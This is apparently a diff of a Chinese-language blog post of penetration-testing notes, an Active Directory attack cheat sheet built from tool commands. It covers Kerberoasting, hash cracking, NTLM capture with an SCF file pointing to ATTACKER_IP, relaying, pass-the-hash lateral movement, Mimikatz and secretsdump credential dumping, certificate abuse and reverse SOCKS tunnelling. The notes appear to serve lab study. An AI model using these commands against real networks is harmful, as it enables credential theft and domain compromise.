+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GetNPUsers.py corp.local/ -dc-ip 10.10.10.10 -usersfile users.txt -format hashcat -outputfile asrep.hash</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="GetUserSPNs-py（Kerberoast）"><a href="#GetUserSPNs-py（Kerberoast）" class="headerlink" title="GetUserSPNs.py（Kerberoast）"></a>GetUserSPNs.py（Kerberoast）</h2><p>常见攻击场景：</p>
+<ol>
+<li>请求服务票据，离线破解服务账号密码。</li>
+</ol>
+<p>常用参数（含解释）：</p>
+<ul>
+<li><code>-request</code>：请求 TGS hash。</li>
+<li><code>-dc-ip &lt;IP&gt;</code>：指定 DC。</li>
+<li><code>-t &lt;user&gt;</code>：仅针对特定用户。</li>
+<li><code>-outputfile &lt;file&gt;</code>：保存 hash。</li>
+</ul>
+<p>示例：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -request -dc-ip 10.10.10.100 -outputfile kerberoast.hash</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="gpp-decrypt"><a href="#gpp-decrypt" class="headerlink" title="gpp-decrypt"></a>gpp-decrypt</h2><p>常见攻击场景：</p>
+<ol>
+<li>解密 GPP 中 <code>cpassword</code>。</li>
+</ol>
+<p>常见步骤：</p>
+<ol>
+<li>用 <code>smbclient/smbmap</code> 下载 <code>Groups.xml</code>。</li>
+<li>提取 <code>cpassword</code>。</li>
+<li>执行 <code>gpp-decrypt &lt;cpassword&gt;</code>。</li>
+</ol>
+<h2 id="hashcat"><a href="#hashcat" class="headerlink" title="hashcat"></a>hashcat</h2><p>常见攻击场景：</p>
+<ol>
+<li>破解 AS-REP &#x2F; Kerberoast &#x2F; NTLM 哈希。</li>
+</ol>
+<p>常用参数（含解释）：</p>
+<ul>
+<li><code>-m &lt;mode&gt;</code>：哈希类型。</li>
+<li><code>-a 0</code>：字典攻击。</li>
+<li><code>-r &lt;rule&gt;</code>：规则增强。</li>
+<li><code>--show</code>：显示已破解结果。</li>
+</ul>
+<p>常见模式：</p>
+<ul>
+<li><code>18200</code>：AS-REP</li>
+<li><code>13100</code>：Kerberoast</li>
+<li><code>5600</code>：NTLM</li>
+</ul>
+<p>示例：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 18200 -a 0 asrep.hash /usr/share/wordlists/rockyou.txt</span><br><span class="line">hashcat -m 13100 -a 0 kerberoast.hash /usr/share/wordlists/rockyou.txt</span><br><span class="line">hashcat -m 5600 -a 0 ntlm.hash /usr/share/wordlists/rockyou.txt --show</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="john"><a href="#john" class="headerlink" title="john"></a>john</h2><p>常见攻击场景：</p>
+<ol>
+<li>小规模 hash 快速验证。</li>
+</ol>
+<p>常用参数（含解释）：</p>
+<ul>
+<li><code>--wordlist=&lt;file&gt;</code>：字典。</li>
+<li><code>--rules</code>：规则变形。</li>
+<li><code>--format=&lt;type&gt;</code>：哈希格式。</li>
+<li><code>--show</code>：显示已破解条目。</li>
+</ul>
+<p>示例：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt</span><br><span class="line">john --show hashes.txt</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="Responder"><a href="#Responder" class="headerlink" title="Responder"></a>Responder</h2><p>常见攻击场景：</p>
+<ol>
+<li>诱导认证并捕获 NetNTLMv1&#x2F;v2。</li>
+</ol>
+<p>常用参数（含解释）：</p>
+<ul>
+<li><code>-I &lt;iface&gt;</code>：监听网卡。</li>
+<li><code>-w</code>：启用 WPAD。</li>
+<li><code>-v</code>：详细输出。</li>
+</ul>
+<p>示例：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">responder -I eth0 -wv</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="SCF-文件诱导（技巧）"><a href="#SCF-文件诱导（技巧）" class="headerlink" title="SCF 文件诱导（技巧）"></a>SCF 文件诱导（技巧）</h2><p>常见攻击场景：</p>
+<ol>
+<li>在可写共享投放 <code>.scf</code>，触发 UNC 认证请求。</li>
+</ol>
+<p>示例：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="INI"><figure class="iseeu highlight /ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[Shell]</span></span><br><span class="line"><span class="attr">Command</span>=<span class="number">2</span></span><br><span class="line"><span class="attr">IconFile</span>=\\ATTACKER_IP\share\test.ico</span><br><span class="line"><span class="section">[Taskbar]</span></span><br><span class="line"><span class="attr">Command</span>=ToggleDesktop</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="ntlmrelayx-py"><a href="#ntlmrelayx-py" class="headerlink" title="ntlmrelayx.py"></a>ntlmrelayx.py</h2><p>常见攻击场景：</p>
+<ol>
+<li>将捕获到的 NTLM 认证中继到 SMB&#x2F;LDAP。</li>
+</ol>
+<p>常用参数（含解释）：</p>
+<ul>
+<li><code>-tf &lt;targets.txt&gt;</code>：目标列表。</li>
+<li><code>-t &lt;target&gt;</code>：单目标。</li>
+<li><code>-smb2support</code>：启用 SMB2。</li>
+<li><code>--escalate-user &lt;user&gt;</code>：LDAP 场景提权。</li>
+</ul>
+<p>示例：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ntlmrelayx.py -tf targets.txt -smb2support</span><br><span class="line">ntlmrelayx.py -t ldap://10.10.10.10 --escalate-user jerry</span><br></pre></td></tr></table></figure></div>
+
+<h1 id="阶段-3：拿会话与验证可登录面"><a href="#阶段-3：拿会话与验证可登录面" class="headerlink" title="阶段 3：拿会话与验证可登录面"></a>阶段 3：拿会话与验证可登录面</h1><h2 id="NetExec（nxc）"><a href="#NetExec（nxc）" class="headerlink" title="NetExec（nxc）"></a>NetExec（nxc）</h2><p>说明：<code>crackmapexec</code> 的后继社区版本。</p>
+<p>常见攻击场景：</p>
+<ol>
+<li>喷洒后批量验证 SMB&#x2F;WinRM 登录。</li>
+<li>枚举共享与会话，确认横向目标。</li>
+</ol>
+<p>常用参数（含解释）：</p>
+<ul>
+<li><code>smb/winrm/ldap</code>：协议模块。</li>
+<li><code>-u/-p</code>：用户名密码（支持文件）。</li>
+<li><code>-H &lt;nthash&gt;</code>：PTH 登录。</li>
+<li><code>--shares/--sessions</code>：共享与会话。</li>
+<li><code>-X &#39;&lt;cmd&gt;&#39;</code>：远程命令执行。</li>
+</ul>
+<p>示例：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nxc smb 10.10.10.0/24 -u users.txt -p pass.txt --continue-on-success</span><br><span class="line">nxc winrm 10.10.10.0/24 -u Administrator -H &lt;NTHASH&gt;</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="evil-winrm"><a href="#evil-winrm" class="headerlink" title="evil-winrm"></a>evil-winrm</h2><p>常见攻击场景：</p>
+<ol>
+<li>5985&#x2F;5986 开放时拿稳定 PowerShell 会话。</li>
+</ol>
+<p>常用参数（含解释）：</p>
+<ul>
+<li><code>-i</code>：目标 IP。</li>
+<li><code>-u</code>：用户名。</li>
+<li><code>-p</code>：密码。</li>
+<li><code>-H</code>：NTLM hash。</li>
+<li><code>-P</code>：端口。</li>
+<li><code>-S</code>：HTTPS。</li>
+</ul>
+<p>示例：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.10.10.20 -u administrator -p <span class="string">&#x27;P@ssw0rd!&#x27;</span></span><br><span class="line">evil-winrm -i 10.10.10.20 -u administrator -H &lt;NTHASH&gt;</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="winrs-exe"><a href="#winrs-exe" class="headerlink" title="winrs.exe"></a>winrs.exe</h2><p>常见攻击场景：</p>
+<ol>
+<li>Windows 原生 WinRM 客户端远程执行。</li>
+</ol>
+<p>常用参数（含解释）：</p>
+<ul>
+<li><code>-r:&lt;target&gt;</code>：目标。</li>
+<li><code>-u:&lt;user&gt;</code>：用户名。</li>
+<li><code>-p:&lt;pass&gt;</code>：密码。</li>
+<li><code>-d:&lt;path&gt;</code>：启动目录。</li>
+</ul>
+<p>示例：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CMD"><figure class="iseeu highlight /cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrs -r:<span class="number">10</span>.<span class="number">10</span>.<span class="number">10</span>.<span class="number">20</span> -u:corp\jerry -p:Summer2025! <span class="built_in">cmd</span></span><br></pre></td></tr></table></figure></div>
+
+<h2 id="xfreerdp"><a href="#xfreerdp" class="headerlink" title="xfreerdp"></a>xfreerdp</h2><p>常见攻击场景：</p>
+<ol>
+<li>图形化登录 Windows 主机，执行桌面侧操作。</li>
+</ol>
+<p>常用参数（含解释）：</p>
+<ul>
+<li><code>/v:&lt;IP&gt;</code>：目标。</li>
+<li><code>/u:&lt;user&gt;</code>：用户。</li>
+<li><code>/p:&lt;pass&gt;</code>：密码。</li>
+<li><code>/pth:&lt;hash&gt;</code>：PTH。</li>
+<li><code>/d:&lt;domain&gt;</code>：域。</li>
+<li><code>/cert:ignore</code>：忽略证书。</li>
+<li><code>/dynamic-resolution</code>：动态分辨率。</li>
+<li><code>/drive:share,/tmp</code>：本地目录映射。</li>
+<li><code>+clipboard</code>：共享剪贴板。</li>
+</ul>
+<p>示例：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xfreerdp /v:10.10.10.20 /u:administrator /p:<span class="string">&#x27;P@ssw0rd!&#x27;</span> /cert:ignore /dynamic-resolution +clipboard</span><br></pre></td></tr></table></figure></div>
+
+<h1 id="阶段-4：横向移动与远程执行"><a href="#阶段-4：横向移动与远程执行" class="headerlink" title="阶段 4：横向移动与远程执行"></a>阶段 4：横向移动与远程执行</h1><h2 id="psexec-py（Impacket）"><a href="#psexec-py（Impacket）" class="headerlink" title="psexec.py（Impacket）"></a>psexec.py（Impacket）</h2><p>工作原理：</p>
+<ul>
+<li>通过 SMB 连接 <code>ADMIN$</code>，上传服务程序并经 RPC 创建&#x2F;启动服务，获得交互 shell。</li>
+</ul>
+<p>常用参数（含解释）：</p>
+<ul>
+<li><code>-hashes :&lt;NTHASH&gt;</code>：使用 NTLM hash。</li>
+<li><code>DOMAIN/USER@TARGET</code>：目标身份格式。</li>
+<li><code>&#39;whoami&#39;</code>：可直接指定执行命令。</li>
+</ul>
+<p>示例：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">impacket-psexec -hashes :&lt;NT_HASH&gt; DOMAIN/USERNAME@&lt;TARGET_IP&gt;</span><br><span class="line">impacket-psexec -hashes :&lt;NT_HASH&gt; DOMAIN/USERNAME@&lt;TARGET_IP&gt; <span class="string">&#x27;whoami&#x27;</span></span><br></pre></td></tr></table></figure></div>
+
+<h2 id="smbexec-py（Impacket）"><a href="#smbexec-py（Impacket）" class="headerlink" title="smbexec.py（Impacket）"></a>smbexec.py（Impacket）</h2><p>工作原理：</p>
+<ul>
+<li>通过 RPC 创建服务执行命令，将输出重定向到 SMB 共享再回读。</li>
+</ul>
+<p>常用参数（含解释）：</p>
+<ul>
+<li><code>-hashes :&lt;NTHASH&gt;</code>：PTH。</li>
+<li><code>DOMAIN/USER@TARGET</code>：目标身份。</li>
+</ul>
+<p>示例：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-smbexec -hashes :&lt;NT_HASH&gt; DOMAIN/USERNAME@&lt;TARGET_IP&gt;</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="wmiexec-py（Impacket）"><a href="#wmiexec-py（Impacket）" class="headerlink" title="wmiexec.py（Impacket）"></a>wmiexec.py（Impacket）</h2><p>工作原理：</p>
+<ul>
+<li>通过 WMI&#x2F;DCOM（135+高端口）远程执行，通常更隐蔽。</li>
+</ul>
+<p>常用参数（含解释）：</p>
+<ul>
+<li><code>-hashes :&lt;NTHASH&gt;</code>：PTH。</li>
+<li><code>DOMAIN/USER@TARGET</code>：目标身份。</li>
+</ul>
+<p>示例：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-wmiexec -hashes :&lt;NT_HASH&gt; DOMAIN/USERNAME@&lt;TARGET_IP&gt;</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="atexec-py（Impacket）"><a href="#atexec-py（Impacket）" class="headerlink" title="atexec.py（Impacket）"></a>atexec.py（Impacket）</h2><p>工作原理：</p>
+<ul>
+<li>通过计划任务机制执行命令。</li>
+</ul>
+<p>常用参数（含解释）：</p>
+<ul>
+<li><code>&lt;domain&gt;/&lt;user&gt;:&lt;pass&gt;@&lt;target&gt;</code>：认证目标。</li>
+<li><code>-hashes</code>：支持 hash 认证。</li>
+</ul>
+<h2 id="dcomexec-py（Impacket）"><a href="#dcomexec-py（Impacket）" class="headerlink" title="dcomexec.py（Impacket）"></a>dcomexec.py（Impacket）</h2><p>工作原理：</p>
+<ul>
+<li>使用 DCOM 不同端点远程执行命令。</li>
+</ul>
+<p>常用参数（含解释）：</p>
+<ul>
+<li><code>-hashes</code>：hash 认证。</li>
+<li><code>&lt;domain&gt;/&lt;user&gt;@&lt;target&gt;</code>：目标。</li>
+</ul>
+<h2 id="runas"><a href="#runas" class="headerlink" title="runas"></a>runas</h2><p>常见攻击场景：</p>
+<ol>
+<li>切换网络身份访问资源。</li>
+<li><code>/netonly</code> 常用于跨域资源访问。</li>
+</ol>
+<p>常用参数（含解释）：</p>
+<ul>
+<li><code>/user:&lt;domain\user&gt;</code>：指定用户。</li>
+<li><code>/netonly</code>：仅网络访问使用该凭据。</li>
+<li><code>/savecred</code>：使用已保存凭据（重点审计项）。</li>
+<li><code>/noprofile</code>：不加载配置文件。</li>
+</ul>
+<p>示例：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CMD"><figure class="iseeu highlight /cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">runas /netonly /user:active.htb\svc_tgs <span class="built_in">cmd</span></span><br></pre></td></tr></table></figure></div>
+
+<h2 id="sc-exe"><a href="#sc-exe" class="headerlink" title="sc.exe"></a>sc.exe</h2><p>常见攻击场景：</p>
+<ol>
+<li>远程创建&#x2F;启动服务执行命令。</li>
+<li>服务配置不当场景中的提权利用。</li>
+</ol>
+<p>常用参数（含解释）：</p>
+<ul>
+<li><code>\\TARGET</code>：远程目标。</li>
+<li><code>create/start/stop/delete/query/config</code>：服务管理动作。</li>
+</ul>
+<p>示例：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CMD"><figure class="iseeu highlight /cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sc \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">50</span> query</span><br><span class="line">sc \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">50</span> create DemoSvc binPath= &quot;C:\Windows\Temp\demo.exe&quot;</span><br><span class="line">sc \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">50</span> <span class="built_in">start</span> DemoSvc</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="schtasks"><a href="#schtasks" class="headerlink" title="schtasks"></a>schtasks</h2><p>常见攻击场景：</p>
+<ol>
+<li>远程创建并立即执行任务。</li>
+<li>横向后做短期持久化。</li>
+</ol>
+<p>常用参数（含解释）：</p>
+<ul>
+<li><code>/s TARGET</code>：远程目标。</li>
+<li><code>/create</code>：创建任务。</li>
+<li><code>/run</code>：立即运行任务。</li>
+<li><code>/delete /f</code>：删除任务并强制。</li>
+<li><code>/RU SYSTEM</code>：SYSTEM 身份执行。</li>
+<li><code>/tn</code>：任务名称。</li>
+</ul>
+<p>示例：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CMD"><figure class="iseeu highlight /cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">schtasks /s TARGET /RU &quot;SYSTEM&quot; /create /tn &quot;THMtask1&quot; /tr &quot;<span class="built_in">cmd</span> /c whoami &gt; C:\Windows\Temp\w.txt&quot; /sc ONCE /sd <span class="number">01</span>/<span class="number">01</span>/<span class="number">1970</span> /st <span class="number">00</span>:<span class="number">00</span></span><br><span class="line">schtasks /s TARGET /run /tn &quot;THMtask1&quot;</span><br><span class="line">schtasks /s TARGET /tn &quot;THMtask1&quot; /delete /f</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="chisel"><a href="#chisel" class="headerlink" title="chisel"></a>chisel</h2><p>常见攻击场景：</p>
+<ol>
+<li>双网段环境建立 SOCKS 隧道。</li>
+<li>端口转发让本地工具访问内网服务。</li>
+</ol>
+<p>常用参数（含解释）：</p>
+<ul>
+<li><code>server -p &lt;port&gt;</code>：服务端监听。</li>
+<li><code>--reverse</code>：反向隧道。</li>
+<li><code>client &lt;server:port&gt; R:socks</code>：建立反向 socks。</li>
+</ul>
+<p>示例：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 攻击机</span></span><br><span class="line">chisel server -p 9001 --reverse</span><br><span class="line"></span><br><span class="line"><span class="comment"># 受控主机</span></span><br><span class="line">chisel.exe client 10.10.10.100:9001 R:socks</span><br></pre></td></tr></table></figure></div>
+
+<h1 id="阶段-5：本地提权与凭据提取"><a href="#阶段-5：本地提权与凭据提取" class="headerlink" title="阶段 5：本地提权与凭据提取"></a>阶段 5：本地提权与凭据提取</h1><h2 id="winPEAS（PEASS-ng）"><a href="#winPEAS（PEASS-ng）" class="headerlink" title="winPEAS（PEASS-ng）"></a>winPEAS（PEASS-ng）</h2><p>常见攻击场景：</p>
+<ol>
+<li>快速识别本地提权路径和配置错误。</li>
+</ol>
+<p>常用参数（含解释）：</p>
+<ul>
+<li><code>winPEASx64.exe</code>：全量扫描。</li>
+<li><code>quiet cmd fast</code>：低噪音、较快扫描。</li>
+</ul>
+<p>示例：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="POWERSHELL"><figure class="iseeu highlight /powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">winPEASx64.exe</span><br><span class="line">winPEASx64.exe quiet cmd fast</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="Potato-系列（BadPotato-SweetPotato）"><a href="#Potato-系列（BadPotato-SweetPotato）" class="headerlink" title="Potato 系列（BadPotato &#x2F; SweetPotato）"></a>Potato 系列（BadPotato &#x2F; SweetPotato）</h2><p>常见攻击场景：</p>
+<ol>
+<li>具备 <code>SeImpersonatePrivilege</code> 时尝试提权到 SYSTEM。</li>
+</ol>
+<p>注意：</p>
+<ul>
+<li>必须先确认权限条件，否则成功率低。</li>
+</ul>
+<h2 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a>Mimikatz</h2><p>常见攻击场景：</p>
+<ol>
+<li>抓取明文&#x2F;哈希&#x2F;票据。</li>
+<li>DCSync 抓域高价值哈希。</li>
+</ol>
+<p>常用命令（含解释）：</p>
+<ul>
+<li><code>privilege::debug</code>：起手式，开启调试权限。</li>
+<li><code>sekurlsa::logonpasswords</code>：抓登录会话凭据。</li>
+<li><code>sekurlsa::msv</code>：只看 hash。</li>
+<li><code>lsadump::sam</code>：导出本机 SAM。</li>
+<li><code>lsadump::secrets</code>：读取 LSA Secrets。</li>
+<li><code>lsadump::dcsync /domain:&lt;d&gt; /user:&lt;u&gt;</code>：执行 DCSync。</li>
+<li><code>sekurlsa::tickets /export</code>：导出票据。</li>
+<li><code>kerberos::ptt &lt;kirbi&gt;</code>：注入票据。</li>
+<li><code>token::list/elevate/revert</code>：令牌操作。</li>
+</ul>
+<h2 id="secretsdump-py（Impacket）"><a href="#secretsdump-py（Impacket）" class="headerlink" title="secretsdump.py（Impacket）"></a>secretsdump.py（Impacket）</h2><p>常见攻击场景：</p>
+<ol>
+<li>导出本地&#x2F;域控凭据材料。</li>
+</ol>
+<p>常用参数（含解释）：</p>
+<ul>
+<li><code>-hashes :&lt;nthash&gt;</code>：Hash 登录。</li>
+<li><code>-just-dc-ntlm</code>：仅导出域 NTLM。</li>
+<li><code>-ntds &lt;file&gt; -system &lt;file&gt; LOCAL</code>：离线解析。</li>
+</ul>
+<p>示例：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">secretsdump.py corp.local/administrator@10.10.10.10 -hashes :&lt;NTHASH&gt;</span><br><span class="line">secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL</span><br></pre></td></tr></table></figure></div>
+
+<h1 id="阶段-6：域提权、票据与持久化"><a href="#阶段-6：域提权、票据与持久化" class="headerlink" title="阶段 6：域提权、票据与持久化"></a>阶段 6：域提权、票据与持久化</h1><h2 id="certipy"><a href="#certipy" class="headerlink" title="certipy"></a>certipy</h2><p>常见攻击场景：</p>
+<ol>
+<li>枚举 AD CS 模板误配（ESC）。</li>
+<li>证书滥用获取高权身份。</li>
+</ol>
+<p>常用子命令&#x2F;参数（含解释）：</p>
+<ul>
+<li><code>find</code>：枚举模板漏洞。</li>
+<li><code>req</code>：申请证书。</li>
+<li><code>auth</code>：用 PFX 认证。</li>
+<li><code>-u/-p</code>：账户凭据。</li>
+<li><code>-dc-ip</code>：域控。</li>
+<li><code>-vulnerable</code>：仅显示可利用模板。</li>
+<li><code>-ca/-template/-upn</code>：指定 CA、模板、目标 UPN。</li>
+</ul>
+<p>示例：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">certipy find -u jerry@corp.local -p <span class="string">&#x27;Summer2025!&#x27;</span> -dc-ip 10.10.10.10 -vulnerable</span><br><span class="line">certipy req -u jerry@corp.local -p <span class="string">&#x27;Summer2025!&#x27;</span> -ca corp-CA -template User -upn administrator@corp.local</span><br><span class="line">certipy auth -pfx administrator.pfx</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="Rubeus"><a href="#Rubeus" class="headerlink" title="Rubeus"></a>Rubeus</h2><p>常见攻击场景：</p>
+<ol>
+<li>Kerberoast &#x2F; AS-REP roast。</li>
+<li>票据注入与会话票据管理。</li>
+</ol>
+<p>常用子命令（含解释）：</p>
+<ul>
+<li><code>kerberoast</code>：导出可破解 TGS。</li>
+<li><code>asreproast</code>：导出 AS-REP。</li>
+<li><code>triage</code>：查看票据。</li>
+<li><code>ptt</code>：Pass-the-Ticket。</li>
+</ul>
+<p>示例：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="POWERSHELL"><figure class="iseeu highlight /powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe kerberoast /outfile:kerberoast.txt</span><br><span class="line">Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt</span><br><span class="line">Rubeus.exe triage</span><br><span class="line">Rubeus.exe ptt /ticket:base64.kirbi</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="ticketer-py（Impacket）"><a href="#ticketer-py（Impacket）" class="headerlink" title="ticketer.py（Impacket）"></a>ticketer.py（Impacket）</h2><p>常见攻击场景：</p>
+<ol>
+<li>伪造黄金&#x2F;白银票据（高风险、高权限前提）。</li>
+</ol>
+<p>常用参数（含解释）：</p>
+<ul>
+<li><code>-domain &lt;domain&gt;</code>：域名。</li>
+<li><code>-domain-sid &lt;sid&gt;</code>：域 SID。</li>
+<li><code>-nthash &lt;krbtgt_hash&gt;</code>：KRBTGT 哈希。</li>
+<li><code>&lt;username&gt;</code>：伪造身份用户名。</li>
+</ul>
+<h1 id="阶段-7：后渗透基础命令与辅助框架"><a href="#阶段-7：后渗透基础命令与辅助框架" class="headerlink" title="阶段 7：后渗透基础命令与辅助框架"></a>阶段 7：后渗透基础命令与辅助框架</h1><h2 id="常见-Windows-内置命令（拿到-shell-后）"><a href="#常见-Windows-内置命令（拿到-shell-后）" class="headerlink" title="常见 Windows 内置命令（拿到 shell 后）"></a>常见 Windows 内置命令（拿到 shell 后）</h2><ul>
+<li><code>whoami /all</code>：身份、组、特权</li>
+<li><code>ipconfig /all</code>：网络和 DNS</li>
+<li><code>systeminfo</code>：系统与补丁</li>
+<li><code>net user /domain</code>：域用户</li>
+<li><code>net group &quot;Domain Admins&quot; /domain</code>：域管成员</li>
+<li><code>nltest /dclist:&lt;domain&gt;</code>：域控列表</li>
+<li><code>klist</code>：票据缓存</li>
+</ul>
+<h2 id="Nishang（PowerShell-框架）"><a href="#Nishang（PowerShell-框架）" class="headerlink" title="Nishang（PowerShell 框架）"></a>Nishang（PowerShell 框架）</h2><p>常见攻击场景：</p>
+<ol>
+<li>PowerShell 场景下脚本化后渗透。</li>
+</ol>
+<p>注意要点：</p>
+<ul>
+<li>常见要求 PowerShell v3+</li>
+<li>导入模块：<code>Import-Module .\nishang.psm1</code></li>
+<li>执行策略调整和绕过动作应仅用于授权实验环境</li>
+</ul>
+<h2 id="Impacket-工具包其他脚本说明"><a href="#Impacket-工具包其他脚本说明" class="headerlink" title="Impacket 工具包其他脚本说明"></a>Impacket 工具包其他脚本说明</h2><p>除本笔记中已经在各阶段使用的脚本外，常见还有：</p>
+<ul>
+<li><code>smbserver.py</code>：快速搭建 SMB 服务（传文件&#x2F;诱导认证）</li>
+<li><code>rpcdump.py</code>：枚举 RPC 端点</li>
+<li><code>rpcmap.py</code>：枚举&#x2F;探测 RPC 接口（可配合爆破 opnum&#x2F;uuid）</li>
+<li><code>lookupsid.py</code>：SID 枚举用户组</li>
+<li><code>GetTGT.py</code>：基于密码&#x2F;hash&#x2F;aesKey 请求 TGT</li>
+<li><code>smbclient.py</code>：Impacket 自带 SMB 客户端</li>
+</ul>
 
     </div>
 
@@ -286,9 +837,9 @@
 
       <footer class="post-footer">
           <div class="post-tags">
+              <a href="/tags/%E7%AC%94%E8%AE%B0/" rel="tag"># 笔记</a>
